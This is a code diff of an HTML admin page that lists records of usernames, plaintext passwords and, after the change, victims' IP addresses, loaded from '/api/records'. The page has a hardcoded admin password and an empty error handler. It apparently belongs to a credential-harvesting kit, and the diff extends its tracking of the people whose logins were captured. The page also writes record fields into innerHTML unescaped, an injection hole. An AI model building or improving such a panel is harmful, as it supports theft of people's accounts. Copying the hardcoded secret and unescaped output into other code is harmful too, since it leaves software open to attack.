@@ -7,10 +7,10 @@
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: 'Segoe UI', sans-serif; background: #f8fafc; padding: 20px; }
-        .container { max-width: 1200px; margin: auto; background: white; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
+        .container { max-width: 1300px; margin: auto; background: white; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
         .header { background: #1e40af; color: white; padding: 20px; text-align: center; }
         table { width: 100%; border-collapse: collapse; }
-        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }
+        th, td { padding: 14px; text-align: left; border-bottom: 1px solid #ddd; }
         th { background: #e2e8f0; }
     </style>
 </head>
@@ -28,6 +28,7 @@
                     <th>Type</th>
                     <th>Username</th>
                     <th>Password</th>
+                    <th>IP</th>
                 </tr>
             </thead>
             <tbody></tbody>
@@ -38,20 +39,23 @@
         const ADMIN_PASSWORD = "tunde6035";
 
         async function loadRecords() {
-            const res = await fetch('/api/records');
-            const records = await res.json();
-            const tbody = document.querySelector('#recordsTable tbody');
-            tbody.innerHTML = "";
+            try {
+                const res = await fetch('/api/records');
+                const records = await res.json();
+                const tbody = document.querySelector('#recordsTable tbody');
+                tbody.innerHTML = "";
 
-            records.forEach(r => {
-                tbody.innerHTML += `
-                    <tr>
-                        <td>${r.timestamp}</td>
-                        <td>${r.type}</td>
-                        <td><strong>${r.username || '-'}</strong></td>
-                        <td>${r.password ? `<code>${r.password}</code>` : '-'}</td>
-                    </tr>`;
-            });
+                records.forEach(r => {
+                    tbody.innerHTML += `
+                        <tr>
+                            <td>${r.timestamp}</td>
+                            <td>${r.type}</td>
+                            <td><strong>${r.username || '-'}</strong></td>
+                            <td>${r.password ? `<code>${r.password}</code>` : '-'}</td>
+                            <td>${r.ip || '-'}</td>
+                        </tr>`;
+                });
+            } catch (e) {}
         }
 
         window.onload = () => {
